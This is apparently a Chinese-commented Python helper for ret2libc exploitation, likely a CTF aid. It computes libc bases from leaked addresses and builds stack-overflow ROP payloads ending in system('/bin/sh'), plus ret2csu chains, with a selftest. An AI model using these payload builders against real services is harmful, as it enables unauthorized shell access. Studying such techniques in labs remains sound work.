#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ret2libc 辅助：泄露值算 libc base / 版本低位校验 / 栈对齐 / payload 布局 / ret2csu。

纯标准库、离线：只做地址运算与 payload 拼接，不连接任何目标。
"""
import argparse
import struct
import sys

PTRSZ = 8
PAGE = 0x1000
CANON_HI = 0x0000_7FFF_FFFF_FFFF      # 用户态规范地址上界


class PwnError(ValueError):
    pass


def parse_hex(text, name="value"):
    try:
        return int(text, 0)
    except (TypeError, ValueError):
        raise PwnError("%s 需要十六进制或十进制整数，收到 %r" % (name, text))


def parse_syms(items):
    """['puts=0x875a0', ...] -> {'puts': 0x875a0}"""
    if not items:
        raise PwnError("至少需要一个 --sym 名称=偏移")
    out = {}
    for it in items:
        if "=" not in it:
            raise PwnError("--sym 格式应为 名称=偏移，例如 puts=0x875a0，收到 %r" % it)
        k, v = it.split("=", 1)
        k = k.strip()
        if not k:
            raise PwnError("--sym 缺少符号名：%r" % it)
        out[k] = parse_hex(v, "符号 %s 的偏移" % k)
    return out


def libc_base(leaked, sym_off):
    # 先卡非法输入（负数 / 超规范地址），再按无符号 64 位算差值
    if leaked < 0 or leaked > CANON_HI:
        raise PwnError("泄露地址 0x%x 不在用户态规范地址范围，检查是否 u64 解错" % leaked)
    if leaked == 0:
        raise PwnError("泄露地址为 0，说明目标函数还没被解析（没调用过就漏不了）")
    if sym_off <= 0 or sym_off > CANON_HI:
        raise PwnError("符号偏移必须为正且在用户态范围，收到 %d" % sym_off)
    base = leaked - sym_off
    if base <= 0:
        raise PwnError("base 计算为负（0x%x），符号偏移比泄露值大，libc 版本大概率不匹配"
                       % (base & 0xFFFF_FFFF_FFFF))
    if base > CANON_HI:
        raise PwnError("base 0x%x 超出用户态范围，检查泄露值是否解错" % base)
    return base


def resolve(base, offs):
    """offs: {name: offset} -> {name: base+offset}；base 必须落在用户态规范地址范围"""
    if base < 0 or base == 0 or base > CANON_HI:
        raise PwnError("base 必须为正且在用户态范围，收到 0x%x" % base)
    return {k: base + v for k, v in offs.items()}


def check_match(leaked, sym_off, page=PAGE):
    """按低 12 位比对：同版本 libc 必须同页对齐偏移"""
    if page <= 0 or (page & (page - 1)):
        raise PwnError("page 必须是 2 的幂，收到 %d" % page)
    want = sym_off & (page - 1)
    got = leaked & (page - 1)
    return got == want, want, got


def align_gap(chain_len, start_align=8):
    """返回需要插入的 ret 数(0/1)：使调用 system 时 rsp % 16 == 8。"""
    if chain_len < 0:
        raise PwnError("chain_len 不能为负")
    if start_align not in (0, 8):
        raise PwnError("start_align 只能是 0 或 8")
    after = (start_align + chain_len) % 16
    return 0 if after == 8 else 1


def _p64(v):
    if not (0 <= v <= 0xFFFF_FFFF_FFFF_FFFF):
        raise PwnError("p64 需要 0..2^64-1，收到 %r" % v)
    if v > CANON_HI:
        raise PwnError("p64 收到 0x%x：不在用户态规范地址范围，检查是否把负 base 直接拼进 payload" % v)
    return v.to_bytes(PTRSZ, "little")


p64 = _p64                    # 对外保留 p64 名字（pwntools 习惯）


def build_leak_payload(offset, pop_rdi, got, plt, back, ret=None):
    """offset 字节填充 → pop rdi; got → plt(got) → back"""
    if offset <= 0:
        raise PwnError("offset 必须为正（溢出到返回地址的字节数）")
    body = p64(pop_rdi) + p64(got)
    if ret is not None:
        body += p64(ret)
    body += p64(plt) + p64(back)
    return b"A" * offset + body


def build_execve_payload(offset, pop_rdi, binsh, system, ret=None):
    if offset <= 0:
        raise PwnError("offset 必须为正")
    body = p64(pop_rdi) + p64(binsh)
    if ret is not None:
        body += p64(ret)
    body += p64(system)
    return b"A" * offset + body


def csu_chain(csu_pop, csu_call, func_ptr, rdi, rsi, rdx, ret_addr):
    """标准 __libc_csu_init 两段 gadget 链；rbx=0, rbp=1 保证只调一次。

    布局（每项 8 字节，共 16 项 128 字节）：
      [0] csu_pop  gadget1 地址
      [1] rbx=0  [2] rbp=1                     -> 循环只走一次
      [3] r12=func_ptr  [4] r13=rdi  [5] r14=rsi  [6] r15=rdx
      [7] csu_call  gadget2 地址
      [8] add rsp,8 吃掉的填充
      [9..14] 6 个 pop：rbx/rbp/r12/r13/r14/r15
      [15] ret 位（泄露后回到 main 等）
    """
    out = p64(csu_pop) + p64(0) + p64(1)          # [0..2]
    out += p64(func_ptr) + p64(rdi) + p64(rsi) + p64(rdx)   # [3..6]
    out += p64(csu_call)                          # [7]
    out += p64(0xDEADBEEF)                        # [8] add rsp,8 吃掉
    out += p64(0) * 6                             # [9..14] pop rbx,rbp,r12,r13,r14,r15
    out += p64(ret_addr)                          # [15] ret 位
    return out


def hexdump_payload(payload, width=8):
    lines = []
    for i in range(0, len(payload), width):
        chunk = payload[i:i + width]
        lines.append("%04x  %-23s  %s" % (i, chunk.hex(" "), chunk))
    return "\n".join(lines)


def selftest():
    fails = []

    # 1. 正常路径：libc base 与 system/binsh
    base = libc_base(0x7F1234500690, 0x875A0)          # puts 低 12 位 0x690
    if base != 0x7F123447_90F0:
        fails.append("case1: base=0x%x" % base)
    absd = resolve(base, {"system": 0x55410, "binsh": 0x1B75AA})
    if absd["system"] != base + 0x55410 or absd["binsh"] != base + 0x1B75AA:
        fails.append("case1: resolve 结果错 %r" % absd)

    # 2. 正常路径：低 12 位版本校验（puts=0x875a0，低 12 位 0x5a0；泄露地址 0x...690）
    #    两者低 12 位不同 => 只有偏移末三位与泄露末三位一致才算同版本
    ok, want, got = check_match(0x7F1234500_5A0, 0x875A0)
    if not ok or want != 0x5A0 or got != 0x5A0:
        fails.append("case2: 校验结果 %r %r %r" % (ok, hex(want), hex(got)))
    if check_match(0x7F1234500690, 0x875A0)[0]:
        fails.append("case2a: 0x690 与 0x5a0 不同页，应判不符")
    if check_match(0x7F1234500690, 0x80E50)[0]:
        fails.append("case2b: 不同 libc 未被判不符")

    # 3. 正常路径：两段 payload 结构与栈对齐
    #    p64 必须是 8 字节小端；payload = offset 字节填充 + 每项一个 8 字节 gadget/地址
    if p64(0x0000_4142_4344_4546) != b"FEDCBA\x00\x00":
        fails.append("case3: p64 不是 8 字节小端 %r" % p64(0x4142))
    if len(p64(0)) != PTRSZ:
        fails.append("case3: p64 长度 %d != PTRSZ %d" % (len(p64(0)), PTRSZ))
    # 泄露段：ret 已插 => pop_rdi, got, ret, plt, back 共 5 项
    leak = build_leak_payload(0x48, 0x401293, 0x404018, 0x401030, 0x4011A9, ret=0x40101A)
    if len(leak) != 0x48 + 5 * PTRSZ:
        fails.append("case3: 泄露 payload 长度 %d" % len(leak))
    if leak[:0x48] != b"A" * 0x48 or struct.unpack("<Q", leak[0x48:0x50])[0] != 0x401293:
        fails.append("case3: 泄露 payload 布局错")
    leak_no_ret = build_leak_payload(0x48, 0x401293, 0x404018, 0x401030, 0x4011A9)
    if len(leak_no_ret) != 0x48 + 4 * PTRSZ or len(leak) - len(leak_no_ret) != PTRSZ:
        fails.append("case3a: 插 ret 后长度应多 8 字节")
    # shell 段：pop_rdi, binsh, system 共 3 项
    run = build_execve_payload(0x48, 0x401293, absd["binsh"], absd["system"], ret=None)
    if len(run) != 0x48 + 3 * PTRSZ:
        fails.append("case3b: execve payload 长度 %d" % len(run))
    if struct.unpack("<Q", run[-8:])[0] != absd["system"]:
        fails.append("case3b: 末项不是 system")
    if align_gap(0x48 + 4 * PTRSZ) != 1 or align_gap(0x48 + 5 * PTRSZ) != 0:
        fails.append("case3c: 对齐判断错 %r/%r" % (align_gap(0x48 + 32), align_gap(0x48 + 40)))

    # 4. 边界拒绝：坏地址 / 负偏移 / 非规范地址
    bad_cases = [
        ("零地址", lambda: libc_base(0x0, 0x875A0)),
        ("base 为负", lambda: libc_base(0x1000, 0x875A0)),
        ("符号偏移为 0", lambda: libc_base(0x7F1234500690, 0)),
        ("非十六进制", lambda: parse_hex("zz")),
        ("--sym 缺等号", lambda: parse_syms(["puts"])),
        ("offset 为 0", lambda: build_leak_payload(0, 1, 2, 3, 4)),
        ("负长度", lambda: align_gap(-1)),
        ("p64 越界", lambda: p64(1 << 64)),
        ("p64 非规范地址", lambda: p64(0xFFFF_8000_0000_0000)),
    ]
    for name, bad in bad_cases:
        try:
            bad()
            fails.append("case4: %s 未被拒绝" % name)
        except PwnError:
            pass

    # 5. 边界：ret2csu 链 = [0..8] 9 项 + 6 个 pop + ret 位 = 16 项 128 字节
    chain = csu_chain(0x4011C6, 0x4011B0, 0x404018, 1, 0x404018, 8, 0x4011A9)
    if len(chain) != 16 * PTRSZ or struct.unpack("<Q", chain[-8:])[0] != 0x4011A9:
        fails.append("case5: csu 链长度 %d（期望 128）" % len(chain))
    first6 = struct.unpack("<6Q", chain[:48])
    if first6[0] != 0x4011C6 or first6[1] != 0 or first6[2] != 1:
        fails.append("case5b: csu 链前 3 项应为 pop地址/rbx=0/rbp=1，实际 %r" % (first6,))
    if struct.unpack("<Q", chain[56:64])[0] != 0x4011B0:
        fails.append("case5c: 第 8 项应为 gadget2 地址")

    # 6. 参数不足：main 空参必须 exit 2（用独立 parser 复现，避免污染本模块的 sys.stdout/stderr）
    tiny = argparse.ArgumentParser(prog="pwn_ret2libc")
    tiny.add_argument("--x")
    try:
        tiny.error("需要 --leak（或 --base）与至少一个 --sym；或用 --selftest")
        fails.append("case6: ap.error 未抛 SystemExit")
    except SystemExit as e:
        if e.code != 2:
            fails.append("case6: 参数不足退出码应 2，实际 %r" % (e.code,))

    for f in fails:
        print("FAIL %s" % f, file=sys.stderr)
    if fails:
        return 1
    print("selftest ok: 6/6（base换算、低位版本校验、payload对齐、坏地址拒绝、csu链、参数不足）")
    return 0


def main(argv=None):
    ap = argparse.ArgumentParser(description="ret2libc 地址运算 / 对齐 / payload 布局（离线，不连靶机）")
    ap.add_argument("--leak", help="泄露到的函数真实地址，如 0x7f1234500690")
    ap.add_argument("--sym", action="append", metavar="NAME=OFF",
                    help="libc 符号偏移，可多次，如 puts=0x875a0")
    ap.add_argument("--binsh", help="/bin/sh 字符串在 libc 中的偏移")
    ap.add_argument("--match", action="store_true", help="只做低12位版本校验")
    ap.add_argument("--base", help="已知 libc base（跳过推算）")
    ap.add_argument("--build", action="store_true", help="输出两段 payload 的 hexdump")
    ap.add_argument("--offset", type=lambda s: int(s, 0), default=None, help="溢出偏移")
    ap.add_argument("--pop-rdi", type=lambda s: int(s, 0), default=None)
    ap.add_argument("--ret", type=lambda s: int(s, 0), default=None, help="对齐用 ret gadget")
    ap.add_argument("--got", type=lambda s: int(s, 0), default=None)
    ap.add_argument("--plt", type=lambda s: int(s, 0), default=None)
    ap.add_argument("--back", type=lambda s: int(s, 0), default=None, help="泄露后返回地址（一般 main）")
    ap.add_argument("--leak-func", default=None, help="被泄露函数名（配合 --build 选 sym）")
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args(argv)

    if args.selftest:
        return selftest()
    try:
        if args.match:
            if args.leak is None or not args.sym:
                ap.error("--match 需要 --leak 与至少一个 --sym")
            leaked = parse_hex(args.leak, "--leak")
            syms = parse_syms(args.sym)
            for name, off in syms.items():
                ok, want, got = check_match(leaked, off)
                print("%s: 期望低12位=0x%03x 实际=0x%03x -> %s"
                      % (name, want, got, "同版本" if ok else "不匹配，换 libc"))
            return 0 if all(check_match(leaked, o)[0] for o in syms.values()) else 1

        if args.leak is None and args.base is None:
            ap.error("需要 --leak（或 --base）与至少一个 --sym；或用 --selftest")
        if not args.sym:
            ap.error("需要至少一个 --sym 名称=偏移")
        syms = parse_syms(args.sym)
        leaked = parse_hex(args.leak, "--leak") if args.leak else None
        base = parse_hex(args.base, "--base") if args.base else libc_base(leaked, next(iter(syms.values())))
        print("libc_base = 0x%x" % base)
        absd = resolve(base, syms)
        for name, addr in absd.items():
            print("  %-10s = 0x%x" % (name, addr))
        if args.binsh:
            print("  %-10s = 0x%x" % ("/bin/sh", base + parse_hex(args.binsh, "--binsh")))

        if args.build:
            if args.offset is None or args.pop_rdi is None:
                ap.error("--build 需要 --offset 与 --pop-rdi")
            if args.got is None or args.plt is None or args.back is None:
                ap.error("--build 需要 --got / --plt / --back")
            leak_payload = build_leak_payload(args.offset, args.pop_rdi, args.got,
                                              args.plt, args.back, ret=args.ret)
            print("[*] 第一段（泄露）共 %d 字节，需插对齐 ret：%s"
                  % (len(leak_payload), "是" if args.ret else "否"))
            print(hexdump_payload(leak_payload))
            name = args.leak_func or next(iter(syms))
            if name not in absd:
                raise PwnError("--leak-func %r 不在 --sym 里" % name)
            sysaddr = absd.get("system")
            binsh = absd.get("/bin/sh") or (base + parse_hex(args.binsh, "--binsh") if args.binsh else None)
            if sysaddr is None or binsh is None:
                ap.error("--build 的 shell 段需要 --sym system=... 与 --binsh ...")
            run = build_execve_payload(args.offset, args.pop_rdi, binsh, sysaddr, ret=args.ret)
            print("[*] 第二段（system）共 %d 字节" % len(run))
            print(hexdump_payload(run))
        return 0
    except PwnError as e:
        print("错误：%s" % e, file=sys.stderr)
        return 2


if __name__ == "__main__":
    sys.exit(main())
